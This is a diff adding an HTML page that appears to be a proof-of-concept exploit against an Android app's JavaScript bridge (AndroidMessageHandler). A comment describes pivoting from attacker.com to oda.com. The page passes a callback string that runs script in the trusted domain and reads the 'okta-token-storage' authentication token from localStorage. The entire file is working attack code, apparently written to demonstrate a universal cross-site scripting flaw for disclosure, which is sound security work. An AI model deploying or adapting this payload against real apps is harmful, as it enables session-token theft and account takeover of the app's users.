@@ -1,0 +1,16 @@
+<html>
+<body>
+  <script>
+   window.onload = function() {
+     if (window.AndroidMessageHandler) {
+       // Pivot from attacker.com to trusted oda.com with payload
+       AndroidMessageHandler.postMessage(JSON.stringify({
+         command: "open-url",
+         url: "https://oda.com/no/account/",
+         callbackString: "alert('UXSS SUCCESS!\\nDomain: ' + document.domain + '\\nToken: ' + localStorage.getItem('okta-token-storage'));"
+       }));
+     }
+   };
+  </script>
+</body>
+</html>
